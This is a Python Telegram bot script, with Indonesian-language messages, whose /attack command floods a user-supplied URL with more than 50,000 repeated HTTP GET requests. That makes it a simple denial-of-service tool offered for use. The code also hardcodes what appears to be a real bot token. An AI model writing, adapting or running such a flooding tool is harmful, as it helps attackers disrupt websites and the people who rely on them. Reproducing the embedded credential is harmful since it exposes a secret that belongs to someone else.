import logging
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes


logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('HALO MAS REK UNTUK MELAKUKAN PENYERANGAN MENGGUNAKAN COMMAND /attack url jumlah')


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        
        if len(context.args) != 2:
            await update.message.reply_text('Penggunaan: /attack <url> <jumlah>')
            return
        
        url = context.args[0]
        jumlah = int(context.args[1])
        
        
        if jumlah <= 50000:
            await update.message.reply_text('Jumlah permintaan harus lebih dari 50000.')
            return
        
        await update.message.reply_text(f"Penyerangan sedang berlangsung ke {url} dengan {jumlah} permintaan...")
        
        successful_requests = 0
        for i in range(jumlah):
            response = requests.get(url)
            if response.status_code == 200:
                successful_requests += 1
            if i % 1 == 0:  
                await update.message.reply_text(f"{i} permintaan telah dikirim...")
        
        await update.message.reply_text(f"Penyerangan selesai. {successful_requests} dari {jumlah} permintaan berhasil.")
    except requests.RequestException as e:
        await update.message.reply_text(f"Permintaan gagal: {e}")
    except Exception as e:
        await update.message.reply_text(f"Kesalahan: {e}")

def main() -> None:
    # Ganti 'YOUR_TOKEN' dengan token bot Anda
    application = Application.builder().token('6802595494:AAHl8kvhor1uYF4IHEyeZmSiXKKByY-3GV8').build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('attack', attack))

    application.run_polling()

if __name__ == '__main__':
    main()
